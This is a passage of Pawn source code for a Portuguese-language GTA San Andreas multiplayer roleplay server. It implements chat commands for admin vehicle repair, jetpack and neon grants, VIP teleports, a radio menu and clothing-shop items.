			    SendClientFormat(playerid, AZUL_WE, "Você desvirou e consertou o veículo de %s", PlayerName(id));
             	new currentveh, Float:angle;
                currentveh = GetPlayerVehicleID(id);
                GetVehicleZAngle(currentveh, angle);
                SetVehicleZAngle(currentveh, angle);
        		SetVehicleHealth(currentveh, 1000);
                RepairVehicle(currentveh);
				return 1;
			}
			else
			{
				SendClientMessage(playerid, COR_ERRO, "Jogador(a) não conectado(a)!");
				return 1;
			}
   		}
		else
		{
            SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
            return 1;
		}
	}
	if(!strcmp(cmd, "/setjetpack", true))
	{
		if(WE_GetInt(f(playerid), "AdminL") == 1)
		{
			tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /SetJetpack [ID]");
				return 1;
			}
			new
				id = strval(tmp)
			;
			if(IsPlayerConnected(id))
			{
			    SendClientFormat(id, AZUL_WE, "%s setou um Jetpack para você.", PlayerName(playerid));
			    SendClientFormat(playerid, AZUL_WE, "Você setou um JatPack para %s", PlayerName(id));
				WE_SetInt(f(id), "Jetpack", 1);
				pInfo[id][Jetpack] = 1;
			}
			else
			{
				SendClientMessage(playerid, COR_BRANCO, "Jogador(a) não conectado(a)!");
			}
			return 1;
   		}
		else
		{
            SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
            return 1;
		}
	}
	if(!strcmp(cmdtext, "/utilitariosls", true))
	{
	    if(aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0 && aInfo[playerid][Ajudante] == 0 && aInfo[playerid][Corregedor] == 0 && pInfo[playerid][PLAYER_VIP] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
	        return 1;
	    }
	    if(pInfo[playerid][PLAYER_VIP] == 1 && Teleporte[playerid] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "O comando já foi executado ou seu tempo para usa-lo acabou!");
	        return 1;
	    }
		if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			SetVehiclePos(GetPlayerVehicleID(playerid), 1169.7283, -1489.6672, 22.7560);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), 359.660797);
		}
		else
		{
			SetPlayerPos(playerid, 1825.384521, -1842.604370, 13.095001);
			SetPlayerFacingAngle(playerid, 359.660797);
		}
		SetCameraBehindPlayer(playerid);
		Teleporte[playerid] = 0;
		return 1;
	}
	if(!strcmp(cmdtext, "/prisaolv", true))
	{
	    if(aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0 && aInfo[playerid][Ajudante] == 0 && aInfo[playerid][Corregedor] == 0 && pInfo[playerid][PLAYER_VIP] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
	        return 1;
	    }
	    if(pInfo[playerid][PLAYER_VIP] == 1 && Teleporte[playerid] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "O comando já foi executado ou seu tempo para usa-lo acabou!");
	        return 1;
	    }
		if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			SetVehiclePos(GetPlayerVehicleID(playerid), 1861.9279,-1700.8024,5202.6694);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), 11.1917);
		}
		else
		{
			SetPlayerPos(playerid, 1861.9279,-1700.8024,5202.6694);
			SetPlayerFacingAngle(playerid, 11.1917);
		}
		SetCameraBehindPlayer(playerid);
		Teleporte[playerid] = 0;
		return 1;
	}
	if(!strcmp(cmdtext, "/bancols", true))
	{
	    if(aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0 && aInfo[playerid][Ajudante] == 0 && aInfo[playerid][Corregedor] == 0 && pInfo[playerid][PLAYER_VIP] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
	        return 1;
	    }
	    if(pInfo[playerid][PLAYER_VIP] == 1 && Teleporte[playerid] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "O comando já foi executado ou seu tempo para usa-lo acabou!");
	        return 1;
	    }
		if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			SetVehiclePos(GetPlayerVehicleID(playerid), 1778.3708,-1721.8687,13.4134);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), 267.0039);
		}
		else
		{
			SetPlayerPos(playerid, 1778.3708,-1721.8687,13.4134);
			SetPlayerFacingAngle(playerid, 267.0039);
		}
		SetCameraBehindPlayer(playerid);
		Teleporte[playerid] = 0;
		return 1;
	}
	if(!strcmp(cmdtext, "/prefeiturals", true))
	{
	    if(aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0 && pInfo[playerid][PLAYER_VIP] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
	        return 1;
	    }
	    if(pInfo[playerid][PLAYER_VIP] == 1 && Teleporte[playerid] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "O comando já foi executado ou seu tempo para usa-lo acabou!");
	        return 1;
	    }
		if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			SetVehiclePos(GetPlayerVehicleID(playerid), 1487.640991, -1739.996215, 13.242293);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), 90.235763);
		}
		else
		{
			SetPlayerPos(playerid, 1487.640991, -1739.996215, 13.242293);
			SetPlayerFacingAngle(playerid, 90.235763);
		}
		SetCameraBehindPlayer(playerid);
		Teleporte[playerid] = 0;
		return 1;
	}
	if(!strcmp(cmdtext, "/delegacials", true))
	{
	    if(aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0 && aInfo[playerid][Ajudante] == 0 && aInfo[playerid][Corregedor] == 0 && pInfo[playerid][PLAYER_VIP] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
	        return 1;
	    }
	    if(pInfo[playerid][PLAYER_VIP] == 1 && Teleporte[playerid] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "O comando já foi executado ou seu tempo para usa-lo acabou!");
	        return 1;
	    }
		if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			SetVehiclePos(GetPlayerVehicleID(playerid), 2780.4939,-1812.2635,11.8438);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), 180.080368);
		}
		else
		{
			SetPlayerPos(playerid, 2780.4939,-1812.2635,11.8438);
			SetPlayerFacingAngle(playerid, 180.080368);
		}
		SetCameraBehindPlayer(playerid);
		Teleporte[playerid] = 0;
		return 1;
	}
	if(!strcmp(cmdtext, "/agencials", true))
	{
	    if(aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0 && aInfo[playerid][Ajudante] == 0 && aInfo[playerid][Corregedor] == 0 && pInfo[playerid][PLAYER_VIP] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
	        return 1;
	    }
	    if(pInfo[playerid][PLAYER_VIP] == 1 && Teleporte[playerid] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "O comando já foi executado ou seu tempo para usa-lo acabou!");
	        return 1;
	    }
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			SetVehiclePos(GetPlayerVehicleID(playerid), 1310.0656,-1391.8311,13.0372);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), 90.0920);
		}
		else
		{
			SetPlayerPos(playerid, 1310.5552,-1387.2856,13.5440);
			SetPlayerFacingAngle(playerid, 2.7775);
		}
		SetCameraBehindPlayer(playerid);
		Teleporte[playerid] = 0;
		return 1;
	}
	if(!strcmp(cmdtext, "/cassino", true))
	{
		SetPlayerPos(playerid, 1119.291625, -1.769978, 1000.690551);
		return 1;
	}
	if(!strcmp(cmdtext, "/acessoilha", true))
	{
    if(IsPlayerInRangeOfPoint(playerid, 2.0, 1389.1432,-2688.5422,13.5391)) // Acesso ILHA
        if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			SetVehiclePos(GetPlayerVehicleID(playerid), 2610.7136, -3443.7930, 7.4280+4);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), 71.2720);
		}
		else
		{
		    SetPlayerPos(playerid, 2594.5100, -3390.0852, -1.1215);
		    SetPlayerFacingAngle(playerid, 181.0047);
		    SetPlayerInterior(playerid, 0);
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
	}
	if(!strcmp(cmdtext, "/acessoterra", true))
	{
    if(IsPlayerInRangeOfPoint(playerid, 2.0, 2583.8850, -3412.0552, 2.1535)) // Acesso TERRA
  		if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			SetVehiclePos(GetPlayerVehicleID(playerid), 1389.1432,-2688.5422,13.5391);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), 157.3725);
		}
		else
		{
		    SetPlayerPos(playerid, 1389.1432,-2688.5422,13.5391);
		    SetPlayerFacingAngle(playerid, 157.3725);
		    SetPlayerInterior(playerid, 0);
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
	}
	if(!strcmp(cmdtext,"/cu",true))
	{
	    SetPlayerPos(playerid,-2002.37585, -2435.92651, 31.10940);
	    return 1;
 	}
	if(!strcmp(cmdtext, "/ilhasul", true))
	{
	    if(aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0 && pInfo[playerid][PLAYER_VIP] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
	        return 1;
	    }
	    if(pInfo[playerid][PLAYER_VIP] == 1 && Teleporte[playerid] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "O comando já foi executado ou seu tempo para usa-lo acabou!");
	        return 1;
	    }
		if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			SetVehiclePos(GetPlayerVehicleID(playerid), 2465.3999023, -3483.3999023, 7.5000000);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), 178.416610);
		}
		else
		{
			SetPlayerPos(playerid, 2465.3999023, -3483.3999023, 7.5000000);
			SetPlayerFacingAngle(playerid, 178.416610);
		}
		SetCameraBehindPlayer(playerid);
		Teleporte[playerid] = 0;
		return 1;
	}
	if(!strcmp(cmdtext, "/ammuls", true))
	{
	    if(aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0 && aInfo[playerid][Ajudante] == 0 && aInfo[playerid][Corregedor] == 0 && pInfo[playerid][PLAYER_VIP] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
	        return 1;
	    }
	    if(pInfo[playerid][PLAYER_VIP] == 1 && Teleporte[playerid] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "O comando já foi executado ou seu tempo para usa-lo acabou!");
	        return 1;
	    }
		if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			SetVehiclePos(GetPlayerVehicleID(playerid), 1360.992065, -1285.878784, 13.037879);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), 359.330780);
		}
		else
		{
			SetPlayerPos(playerid, 1360.992065, -1285.878784, 13.037879);
			SetPlayerFacingAngle(playerid, 359.330780);
		}
		SetCameraBehindPlayer(playerid);
		Teleporte[playerid] = 0;
		return 1;
	}
	if(!strcmp(cmdtext, "/cruzeiro", true))// ACESSO CRUZEIRO
	{
	    if(IsPlayerInRangeOfPoint(playerid, 3.0, 700.5837,-2223.1948,-0.7543))
	    {
	        SetPlayerPos(playerid, 700.3476,-2229.4753,13.1089);
	        SetPlayerFacingAngle(playerid, 181.1184);
		}
	    SetCameraBehindPlayer(playerid);
	    Teleporte[playerid] = 0;
        return 1;
	}
	if(!strcmp(cmdtext, "/mar", true))// ACESSO MAR
	{
	    if(IsPlayerInRangeOfPoint(playerid, 3.0, 700.3476,-2229.4753,13.1089))
	    {
	        SetPlayerPos(playerid, 700.5837,-2223.1948,-0.7543);
	        SetPlayerFacingAngle(playerid, 353.3906);
		}
	    SetCameraBehindPlayer(playerid);
	    Teleporte[playerid] = 0;
        return 1;
	}
	if(!strcmp(cmdtext, "/bincols", true))
	{
	    if(aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0 && aInfo[playerid][Ajudante] == 0 && aInfo[playerid][Corregedor] == 0 && pInfo[playerid][PLAYER_VIP] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
	        return 1;
	    }
	    if(pInfo[playerid][PLAYER_VIP] == 1 && Teleporte[playerid] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "O comando já foi executado ou seu tempo para usa-lo acabou!");
	        return 1;
	    }
		if (GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			SetVehiclePos(GetPlayerVehicleID(playerid), 2245.556884, -1659.454711, 14.969217);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), 73.386764);
		}
		else
		{
			SetPlayerPos(playerid, 2245.556884, -1659.454711, 14.969217);
			SetPlayerFacingAngle(playerid, 73.386764);
		}
		SetCameraBehindPlayer(playerid);
		Teleporte[playerid] = 0;
		return 1;
	}
	if(!strcmp(cmdtext, "/postols", true))
	{
	    if(aInfo[playerid][Admin] == 0 && aInfo[playerid][Moderador] == 0 && aInfo[playerid][Ajudante] == 0 && aInfo[playerid][Corregedor] == 0 && pInfo[playerid][PLAYER_VIP] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não tem permissão!");
	        return 1;
	    }
	    if(pInfo[playerid][PLAYER_VIP] == 1 && Teleporte[playerid] == 0)
	    {
	        SendClientMessage(playerid, COR_ERRO, "O comando já foi executado ou seu tempo para usa-lo acabou!");
	        return 1;
	    }
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			SetVehiclePos(GetPlayerVehicleID(playerid), 1938.160278, -1770.945190, 13.079992);
			SetVehicleZAngle(GetPlayerVehicleID(playerid), 181.523803);
		}
		else
		{
			SetPlayerPos(playerid, 1938.160278, -1770.945190, 13.079992);
			SetPlayerFacingAngle(playerid, 181.523803);
		}
		SetCameraBehindPlayer(playerid);
		Teleporte[playerid] = 0;
		return 1;
	}
	if(!strcmp(cmdtext, "/teles", true))
	{
	    if(aInfo[playerid][Admin] == 1 || aInfo[playerid][Moderador] == 1 || aInfo[playerid][Ajudante] == 1 || aInfo[playerid][Corregedor] == 1 || pInfo[playerid][PLAYER_VIP] == 1)
	    {
			SendClientMessage(playerid, 0xFFFFFFAA, " [TELEPORTES] ");
			SendClientMessage(playerid, 0xFFFFFFAA, "/UtilitariosLS /Alhambra /BancoLS /PrefeituraLS /DelegaciaLS");
			SendClientMessage(playerid, 0xFFFFFFAA, "/AgenciaLS /Ilha /AmmuLS /Loteria /Favela BincoLS /PostoLS");
			SendClientMessage(playerid, 0xFFFFFFAA, " [TELEPORTES] ");
		}
		return 1;
	}
	if(!strcmp(cmd, "/kitneon", true))
	{
		if(WE_GetInt(f(playerid), "AdminL") == 1)
		{
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /KitNeon [ID] [Neon ID]");
				SendClientMessage(playerid, COR_ERRO, "Somente: 1 azul, 2, vermelho, 3 verde, 4 branco, 5 rosa, 6 amrelo, 7 KIT COMPLETO");
			    return 1;
            }
            new
				id = strval(tmp)
			;
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
				SendClientMessage(playerid, COR_ERRO, "Uso válido: /KitNeon [ID] [Neon ID]");
				SendClientMessage(playerid, COR_ERRO, "Somente: 1 azul, 2, vermelho, 3 verde, 4 branco, 5 rosa, 6 amrelo, 7 KIT COMPLETO");
			    return 1;
            }
            new
				kitID = strval(tmp)
			;
			if(kitID <= 0 || kitID > 7)
			{
			    SendClientMessage(playerid, COR_ERRO, "Somente: 1 azul, 2, vermelho, 3 verde, 4 branco, 5 rosa, 6 amrelo, 7 KIT COMPLETO");
			    return 1;
			}
            if(!IsPlayerConnected(id))
            {
                SendClientMessage(playerid, COR_ERRO, "Jogador(a) não está conectado!");
				return 1;
			}
			if(kitID == 1)
			{
	  			format(str, sizeof(str), "O(A) administrador(a) %s setou o neon azul pra você /ListaNeon", PlayerName(playerid));
				SendClientMessage(id, 0xFFCC00AA, str);
				format(str, sizeof(str), "Você setou o neon azul para %s", PlayerName(id));
				SendClientMessage(playerid, 0xFFCC00AA, str);
				WE_SetInt(f(id), "KitNeon", 1);
				WE_SetInt(f(id), "KitAzul", 1);
				return 1;
			}
  			if(kitID == 2)
			{
	  			format(str, sizeof(str), "O(A) administrador(a) %s setou o neon vermelho pra você /ListaNeon", PlayerName(playerid));
				SendClientMessage(id, 0xFFCC00AA, str);
				format(str, sizeof(str), "Você setou o neon vernelho para %s", PlayerName(id));
				SendClientMessage(playerid, 0xFFCC00AA, str);
				WE_SetInt(f(id), "KitNeon", 1);
				WE_SetInt(f(id), "KitVermelho", 1);
				return 1;
			}
  			if(kitID == 3)
			{
	  			format(str, sizeof(str), "O(A) administrador(a) %s setou o neon verde pra você /ListaNeon", PlayerName(playerid));
				SendClientMessage(id, 0xFFCC00AA, str);
				format(str, sizeof(str), "Você setou o neon verde para %s", PlayerName(id));
				SendClientMessage(playerid, 0xFFCC00AA, str);
				WE_SetInt(f(id), "KitNeon", 1);
				WE_SetInt(f(id), "KitVerde", 1);
				return 1;
			}
  			if(kitID == 4)
			{
	  			format(str, sizeof(str), "O(A) administrador(a) %s setou o neon branco pra você /ListaNeon", PlayerName(playerid));
				SendClientMessage(id, 0xFFCC00AA, str);
				format(str, sizeof(str), "Você setou o neon branco para %s", PlayerName(id));
				SendClientMessage(playerid, 0xFFCC00AA, str);
				WE_SetInt(f(id), "KitNeon", 1);
				WE_SetInt(f(id), "KitBranco", 1);
				return 1;
			}
  			if(kitID == 5)
			{
	  			format(str, sizeof(str), "O(A) administrador(a) %s setou o neon rosa pra você /ListaNeon", PlayerName(playerid));
				SendClientMessage(id, 0xFFCC00AA, str);
				format(str, sizeof(str), "Você setou o neon rosa para %s", PlayerName(id));
				SendClientMessage(playerid, 0xFFCC00AA, str);
				WE_SetInt(f(id), "KitNeon", 1);
				WE_SetInt(f(id), "KitRosa", 1);
				return 1;
			}
  			if(kitID == 6)
			{
	  			format(str, sizeof(str), "O(A) administrador(a) %s setou o neon amarelo pra você /ListaNeon", PlayerName(playerid));
				SendClientMessage(id, 0xFFCC00AA, str);
				format(str, sizeof(str), "Você setou o neon amrelo para %s", PlayerName(id));
				SendClientMessage(playerid, 0xFFCC00AA, str);
				WE_SetInt(f(id), "KitNeon", 1);
				WE_SetInt(f(id), "KitAmarelo", 1);
				return 1;
			}
  			if(kitID == 7)
			{
	  			format(str, sizeof(str), "O(A) administrador(a) %s setou o kit neon verde pra você /ListaNeon", PlayerName(playerid));
				SendClientMessage(id, 0xFFCC00AA, str);
				format(str, sizeof(str), "Você setou o kit neon verde para %s", PlayerName(id));
				SendClientMessage(playerid, 0xFFCC00AA, str);
				WE_SetInt(f(id), "KitNeon", 1);
   				WE_SetInt(f(id), "KitAmarelo", 1);
   				WE_SetInt(f(id), "KitRosa", 1);
				WE_SetInt(f(id), "KitBranco", 1);
   				WE_SetInt(f(id), "KitVerde", 1);
				WE_SetInt(f(id), "KitVermelho", 1);
				WE_SetInt(f(id), "KitAzul", 1);
				return 1;
			}
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/listaneon", true))
	{
	    new
			vehicleid = GetPlayerVehicleID(playerid)
		;
      	if(WE_GetInt(f(playerid), "KitNeon") == 1 || pInfo[playerid][PLAYER_VIP] == 1)
	    {
	        if(!IsPlayerInAnyVehicle(playerid))
	        {
	            SendClientMessage(playerid, COR_ERRO, "Você não está em um carro!");
	            return 1;
	        }
	        if(EUmaBike(vehicleid))
	        {
	            SendClientMessage(playerid, COR_ERRO, "Você não pode adicionar neon em motocicletas!");
	            return 1;
	        }
		    ShowPlayerDialog(playerid, 8899, DIALOG_STYLE_LIST, "Neon", "{125CD7}Azul\n{E21D1F}Vermelho\n{1FD637}Verde\n{FFFFFF}Branco\n{E535D0}Rosa\n{EDE751}Amarelo\nRemover Neon", "OK", "SAIR");
		    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 10.0) ;
	    }
	    else
	    {
	        SendClientMessage(playerid, COR_ERRO, "Você não possui nenhum neon!");
	    }
	    return 1;
	}
	if(!strcmp(cmdtext, "/sirene", true))
	{
	    if(pInfo[playerid][Prof] == BOMBEIRO || pInfo[playerid][Prof] == GUARDA_TRANSITO || pInfo[playerid][Prof] == POL_CIVIL || pInfo[playerid][Prof] == POL_MILITAR || pInfo[playerid][Prof] == POL_RODOVIARIO || pInfo[playerid][Prof] == POL_FEDERAL || pInfo[playerid][Prof] == EXERCITO || aInfo[playerid][Admin] == 1)
	    {
		    ShowPlayerDialog(playerid, 8810, DIALOG_STYLE_LIST, "Sirene adicional", "{1E90FF}Sirene\n{FF1E1E}Remover sirene", "OK", "SAIR");
		    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 10.0);
		    return 1;
	    }
	}
	if(!strcmp(cmdtext, "/radios", true))
	{
		new String[500];
		strcat(String, "{1E90FF}{FF1E1E}{1E90FF} {FFFFFF}Rádio EvaRadio\n");
		strcat(String, "{1E90FF}{FF1E1E}{1E90FF} {FFFFFF}Rádio Queen 24/7\n");
		strcat(String, "{1E90FF}{FF1E1E}{1E90FF} {FFFFFF}Rádio The Beatles HQ\n");
		strcat(String, "{1E90FF}{FF1E1E}{1E90FF} {FFFFFF}Rádio 80sMixTapes\n");
		strcat(String, "{1E90FF}{FF1E1E}{1E90FF} {FFFFFF}Rádio One Drection The Radio\n");
		strcat(String, "{1E90FF}{FF1E1E}{1E90FF} {FFFFFF}Desligar rádio");
		ShowPlayerDialog(playerid, D_RADIOS, DIALOG_STYLE_LIST, "Escolha sua rádio", String, "Selecionar", "Cancelar");
		return 1;
	}
	if(!strcmp(cmd, "/usaroculos", true))
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, 0xFF0000FF, "Uso válido: /usarOculos [de 1 à 30]");
			return 1;
		}
		new
			oculosx = strval(tmp)
		;
		if(oculosx < 1 || oculosx > 30)
		{
			SendClientMessage(playerid, 0xFF0000FF, "Uso válido: /usarOculos [de 1 à 30]");
			return 1;
		}
		new
			oOculos[24]
		;
		format(oOculos, sizeof(oOculos), "Oculos%d", oculosx);
		if(WE_GetInt(f(playerid), oOculos) == 1)
		{
	 		RemovePlayerAttachedObject(playerid, 1);
			SetPlayerOculos(playerid, oculosx);
      		format(gStr, sizeof(gStr), "Você colocou o óculos ID %d.", oculosx);
		    SendClientMessage(playerid, -1, gStr);
		    WE_SetInt(f(playerid), "useOculos", oculosx);
		}
		else
		{
		    SendClientMessage(playerid, 0xFF0000AA, "Você não tem esse modelo de óculos!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/oculos", true))
	{
	    if(!IsPlayerInDynamicCP(playerid, CP_5) &&
			!IsPlayerInDynamicCP(playerid, CP_41) &&
			!IsPlayerInDynamicCP(playerid, CP_42) &&
			!IsPlayerInDynamicCP(playerid, CP_43) &&
			!IsPlayerInDynamicCP(playerid, CP_44) &&
			!IsPlayerInDynamicCP(playerid, CP_45))
	    {
		    SendClientMessage(playerid, COR_ERRO, "Você não está em uma loja de roupas!");
			return 1;
		}
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, 0xFF0000FF, "Uso válido: /Oculos [de 1 à 30]");
			return 1;
		}
		new
			oculosx = strval(tmp)
		;
		if(oculosx < 1 || oculosx > 30)
		{
			SendClientMessage(playerid, 0xFF0000FF, "Uso válido: /Oculos [de 1 à 30]");
			return 1;
		}
		new
			oOculos[24]
		;
		format(oOculos, sizeof(oOculos), "Oculos%d", oculosx);
		if(WE_GetInt(f(playerid), oOculos) == 1)
		{
		    format(gStr, sizeof(gStr), "Você já possui esse modelo de óculos! (Use: /usarOculos %d)", oculosx);
		    SendClientMessage(playerid, 0xFF0000AA, gStr);
		    return 1;
		}
		RemovePlayerAttachedObject(playerid, 1);
		SetPlayerOculos(playerid, oculosx);
 		format(gStr, sizeof(gStr), "Você está experimentando o óculos ID %d.", oculosx);
		SendClientMessage(playerid, -1, gStr);
		SetTimerEx("ItenOpcao", 5000, false, "d", playerid);
		useOculos[playerid] = oculosx, useTipo[playerid] = 1;
		return 1;
	}
	if(!strcmp(cmd, "/usarmascara", true))
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, 0xFF0000FF, "Uso válido: /usarMascara [de 1 à 6]");
			return 1;
		}
		new
			mascarax = strval(tmp)
		;
		if(mascarax < 1 || mascarax > 6)
		{
			SendClientMessage(playerid, 0xFF0000FF, "Uso válido: /usarMascara [de 1 à 6]");
			return 1;
		}
		new
			aMascara[24]
		;
		format(aMascara, sizeof(aMascara), "Mascara%d", mascarax);
		if(WE_GetInt(f(playerid), aMascara) == 1)
		{
		    RemovePlayerAttachedObject(playerid, 2);
		    SetPlayerMascara(playerid, mascarax);
      		format(gStr, sizeof(gStr), "Você colocou à  máscara ID %d.", mascarax);
		    SendClientMessage(playerid, -1, gStr);
		    WE_SetInt(f(playerid), "useMascara", mascarax);
		}
		else
		{
		    SendClientMessage(playerid, 0xFF0000AA, "Você não tem esse modelo de máscara!");
		}
		return 1;
	}
	if(!strcmp(cmd, "/mascara", true))
	{
  		if(!IsPlayerInDynamicCP(playerid, CP_5) &&
			!IsPlayerInDynamicCP(playerid, CP_41) &&
			!IsPlayerInDynamicCP(playerid, CP_42) &&
			!IsPlayerInDynamicCP(playerid, CP_43) &&
			!IsPlayerInDynamicCP(playerid, CP_44) &&
			!IsPlayerInDynamicCP(playerid, CP_45))
	    {
		    SendClientMessage(playerid, COR_ERRO, "Você não está em uma loja de roupas!");
			return 1;
		}
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, 0xFF0000FF, "Uso válido: /Mascara [de 1 à 6]");
			return 1;
		}
		new
			mascarax = strval(tmp)
		;
		if(mascarax < 1 || mascarax > 6)
		{
			SendClientMessage(playerid, 0xFF0000FF, "Uso válido: /Mascara [de 1 à 6]");
			return 1;
		}
		new
			aMascara[24]
		;
		format(aMascara, sizeof(aMascara), "Mascara%d", mascarax);
		if(WE_GetInt(f(playerid), aMascara) == 1)
		{
		    format(gStr, sizeof(gStr), "Você já possui esse modelo de máscara! (Use: /usarMascara %d)", mascarax);
		    SendClientMessage(playerid, 0xFF0000AA, gStr);
		    return 1;
		}
		RemovePlayerAttachedObject(playerid, 2);
		SetPlayerMascara(playerid, mascarax);
		format(gStr, sizeof(gStr), "Você está experimentando à máscara ID %d.", mascarax);
		SendClientMessage(playerid, -1, gStr);
 		SetTimerEx("ItenOpcao", 5000, false, "d", playerid);
		useMascara[playerid] = mascarax, useTipo[playerid] = 2;
		return 1;
	}
	if(!strcmp(cmd, "/chapeu", true))
	{
  		if(!IsPlayerInDynamicCP(playerid, CP_5) &&
			!IsPlayerInDynamicCP(playerid, CP_41) &&
			!IsPlayerInDynamicCP(playerid, CP_42) &&
			!IsPlayerInDynamicCP(playerid, CP_43) &&
			!IsPlayerInDynamicCP(playerid, CP_44) &&
			!IsPlayerInDynamicCP(playerid, CP_45))
	    {
		    SendClientMessage(playerid, COR_ERRO, "Você não está em uma loja de roupas!");
			return 1;
		}
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, 0xFF0000FF, "Uso válido: /Chapeu [de 1 à 71]");
			return 1;
		}
		new
			chapeux = strval(tmp)
		;
		if(chapeux < 1 || chapeux > 71)
		{
			SendClientMessage(playerid, 0xFF0000FF, "Uso válido: /Chapeu [de 1 à 71]");
			return 1;
		}
 		new
			oChapeu[24]
		;
		format(oChapeu, sizeof(oChapeu), "Chapeu%d", chapeux);
		if(WE_GetInt(f(playerid), oChapeu) == 1)
		{
		    format(gStr, sizeof(gStr), "Você já possui esse modelo de chapéu! (Use: /usarChapeu %d)", chapeux);
		    SendClientMessage(playerid, 0xFF0000AA, gStr);
		    return 1;
		}
		RemovePlayerAttachedObject(playerid, 4);
        SetPlayerChapeu(playerid, chapeux);
        format(gStr, sizeof(gStr), "Você está experimentando o chapéu ID %d.", chapeux);
		SendClientMessage(playerid, -1, gStr);
		SetTimerEx("ItenOpcao", 5000, false, "d", playerid);
		useChapeu[playerid] = chapeux, useTipo[playerid] = 4;
		return 1;
	}
	if(!strcmp(cmd, "/usarchapeu", true))
	{
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
		{
			SendClientMessage(playerid, 0xFF0000FF, "Uso válido: /usarChapeu [de 1 à 71]");
			return 1;
		}
		new
			chapeux = strval(tmp)
		;
		if(chapeux < 1 || chapeux > 71)
		{
			SendClientMessage(playerid, 0xFF0000FF, "Uso válido: /usarChapeu [de 1 à 71]");
			return 1;
		}
 		new
			oChapeu[24]
		;
		format(oChapeu, sizeof(oChapeu), "Chapeu%d", chapeux);
		if(WE_GetInt(f(playerid), oChapeu) == 1)
		{
			RemovePlayerAttachedObject(playerid, 4);
	        SetPlayerChapeu(playerid, chapeux);
			format(gStr, sizeof(gStr), "Você colocou o chapéu ID %d.", chapeux);
		    SendClientMessage(playerid, -1, gStr);
		    WE_SetInt(f(playerid), "useChapeu", chapeux);
		}
		else
		{
		    SendClientMessage(playerid, 0xFF0000AA, "Você não tem esse modelo de chapéu!");
		}
		return 1;
	}
	if(!strcmp(cmdtext, "/removeritens", true))
	{
  		if(!IsPlayerInDynamicCP(playerid, CP_5) &&
			!IsPlayerInDynamicCP(playerid, CP_41) &&
			!IsPlayerInDynamicCP(playerid, CP_42) &&
			!IsPlayerInDynamicCP(playerid, CP_43) &&
